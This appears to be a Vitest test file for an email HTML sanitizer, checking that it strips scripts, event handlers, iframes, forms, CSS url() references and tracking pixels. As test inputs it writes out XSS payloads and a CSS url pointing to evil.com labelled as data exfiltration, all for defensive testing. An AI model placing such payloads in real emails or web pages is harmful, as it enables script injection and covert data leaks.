import { describe, expect, it } from "vitest";
import { sanitizeEmailHtml } from "../email-sanitizer";

describe("sanitizeEmailHtml", () => {
	it("strips script tags", () => {
		const result = sanitizeEmailHtml('<p>Hello</p><script>alert("xss")</script>');
		expect(result).not.toContain("<script");
		expect(result).not.toContain("alert");
	});

	it("strips event handler attributes", () => {
		const result = sanitizeEmailHtml('<p onmouseover="alert(1)">Hello</p>');
		expect(result).not.toContain("onmouseover");
		expect(result).not.toContain("alert");
	});

	it("strips iframe tags", () => {
		const result = sanitizeEmailHtml('<iframe src="https://evil.com"></iframe>');
		expect(result).not.toContain("<iframe");
	});

	it("strips form tags", () => {
		const result = sanitizeEmailHtml('<form action="https://evil.com"><input type="text"></form>');
		expect(result).not.toContain("<form");
	});

	it("neutralizes CSS url() references to prevent data exfiltration", () => {
		const result = sanitizeEmailHtml(
			"<div style=\"background-image: url('https://evil.com/track?data=secret')\">Hi</div>",
		);
		expect(result).not.toContain("evil.com");
		expect(result).toContain("url()");
	});

	it("neutralizes multiple CSS url() references in one style", () => {
		const result = sanitizeEmailHtml(
			'<td style="background: url(https://a.com/1); list-style-image: url(https://b.com/2)">X</td>',
		);
		expect(result).not.toContain("a.com");
		expect(result).not.toContain("b.com");
	});

	it("preserves safe inline styles without url()", () => {
		const result = sanitizeEmailHtml('<div style="color: red; font-size: 14px">Hello</div>');
		expect(result).toContain("color: red");
		expect(result).toContain("font-size: 14px");
	});

	it("forces links to open in new tab", () => {
		const result = sanitizeEmailHtml('<a href="https://example.com">Click</a>');
		expect(result).toContain('target="_blank"');
		expect(result).toContain('rel="noopener noreferrer"');
	});

	it("removes 1x1 tracking pixels", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://tracker.com/pixel.gif" width="1" height="1">',
		);
		expect(result).not.toContain("tracker.com");
	});

	it("removes tracking pixels with CSS inline dimensions", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://tracker.com/pixel.gif" style="width:1px;height:1px">',
		);
		expect(result).not.toContain("tracker.com");
	});

	it("removes tracking pixels with 0x0 CSS dimensions", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://tracker.com/pixel.gif" style="width: 0px; height: 0px">',
		);
		expect(result).not.toContain("tracker.com");
	});

	it("removes known tracking URL patterns", () => {
		for (const pattern of ["/track", "/pixel", "/open", "beacon"]) {
			const result = sanitizeEmailHtml(
				`<img src="https://example.com${pattern}/img.gif" width="100" height="100">`,
			);
			expect(result).not.toContain(pattern);
		}
	});

	it("blocks remote images by default", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://example.com/photo.jpg" width="200" height="200">',
		);
		expect(result).not.toContain("example.com/photo.jpg");
	});

	it("allows remote images when blockRemoteImages is false", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://example.com/photo.jpg" width="200" height="200">',
			{ blockRemoteImages: false },
		);
		expect(result).toContain("example.com/photo.jpg");
	});

	it("preserves safe HTML content", () => {
		const result = sanitizeEmailHtml("<p>Hello <b>world</b></p><ul><li>item</li></ul>");
		expect(result).toContain("<p>");
		expect(result).toContain("<b>world</b>");
		expect(result).toContain("<li>item</li>");
	});
});
